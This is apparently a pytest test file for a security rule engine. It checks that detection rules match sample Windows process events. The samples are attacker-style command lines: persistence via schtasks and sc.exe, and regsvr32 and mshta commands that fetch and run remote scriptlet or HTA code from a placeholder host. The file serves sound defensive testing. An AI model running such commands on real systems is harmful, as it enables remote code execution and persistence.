import pytest

from backend.services.rule_engine import evaluate_rule, load_rules


@pytest.mark.parametrize(
    ("rule_id", "event"),
    [
        ("SF-PERS-002", {"process": "schtasks.exe", "command_line": "schtasks /create /tn demo /tr calc.exe"}),
        ("SF-LOLBIN-002", {"process": "regsvr32.exe", "command_line": "regsvr32 /s /i:https://example.invalid/a.sct scrobj.dll"}),
        ("SF-LOLBIN-003", {"process": "mshta.exe", "command_line": "mshta https://example.invalid/a.hta"}),
        ("SF-PERS-003", {"process": r"C:\\Windows\\System32\\sc.exe", "command_line": "sc.exe create Demo binPath= C:\\demo.exe"}),
    ],
)
def test_curated_rule_positive_cases(rule_id, event):
    rule = next(rule for rule in load_rules() if rule["id"] == rule_id)
    matched, _ = evaluate_rule(event, rule)
    assert matched is True
